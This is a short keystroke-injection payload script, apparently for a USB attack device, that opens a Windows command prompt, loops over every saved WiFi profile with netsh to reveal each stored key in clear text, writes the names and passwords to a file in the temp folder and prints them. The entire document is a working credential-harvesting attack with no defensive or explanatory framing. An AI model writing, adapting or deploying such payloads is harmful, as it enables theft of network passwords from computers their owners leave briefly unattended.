REM Extract saved WiFi passwords on Windows
DELAY 500
GUI r
DELAY 500
STRING cmd /k
ENTER
DELAY 1000
STRING for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "Profile"') do @for /f "tokens=2 delims=:" %b in ('netsh wlan show profile name^="%a" key^=clear ^| findstr "Key Content"') do @echo %a:%b >> %TEMP%\wifi.txt
ENTER
DELAY 2000
STRING type %TEMP%\wifi.txt
ENTER
